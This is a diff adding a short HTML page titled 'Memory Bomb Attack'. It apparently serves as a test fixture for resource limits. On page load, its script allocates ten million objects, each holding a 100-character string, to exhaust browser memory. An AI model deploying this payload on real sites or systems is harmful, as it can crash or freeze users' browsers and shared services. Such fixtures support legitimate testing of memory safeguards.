@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Memory Bomb Attack</title>
+</head>
+<body>
+  <div id="root">Allocating...</div>
+  <script>
+    // Attack: Large array allocation
+    const bigArray = [];
+    for (let i = 0; i < 10000000; i++) {
+      bigArray.push({ data: 'x'.repeat(100) });
+    }
+    document.getElementById('root').textContent = 'Done';
+  </script>
+</body>
+</html>
